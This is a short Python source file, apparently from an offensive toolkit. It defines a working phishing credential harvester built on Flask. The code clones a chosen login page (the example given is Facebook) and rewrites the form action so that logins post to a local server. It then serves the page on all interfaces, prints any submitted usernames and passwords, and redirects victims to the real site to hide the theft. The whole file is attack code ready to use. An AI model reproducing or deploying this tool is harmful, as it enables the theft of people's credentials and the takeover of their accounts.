from flask import Flask, request
import requests
import re
from appearance.hue import *
def run_credharvest():
	try:
		print (info("Enter the website. eg. https://www.facebook.com"))
		url = input(que("Login phishing url: "))
		field1 = input(que("Username field: "))
		field2 = input(que("Password field: "))
		def FlaskPhish():
			def header_info():
				headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.5 (KHTML, like Gecko)', 'Referer': '{}'.format(url)}
				req1 = requests.get(url, headers=headers)
				data = re.sub(r'(?<=action\=\")(.*?)\"', '/"', req1.text)
				return data
			
			def phish(email,password):
				print (good("CAUGHT POSSIBLE LOGIN CREDS FOR: " + url + "!"))
				print (good("Email/Username: %s" % email))
				print (good("Password: %s" % password))
				#return "OK"

			Ewat = Flask(__name__)
			@Ewat.route('/', methods=['POST', 'GET'])
			def home():
				try:
					if (request.method == 'POST'):
						phish(request.form.get(field1, False), request.form.get(field2, False))
						return '<script>window.location="{}";</script>'.format(url)
					elif(request.method == 'GET'):
						return header_info(), 200
				except Exception as e:
					print (bad("Something happened: %s" % e))
					return ""
			if __name__ == "__main__" or "x" == "x":
				Ewat.run(host='0.0.0.0', port=5000, threaded=True)
					
		FlaskPhish()
	except:
		print ("Error!" )
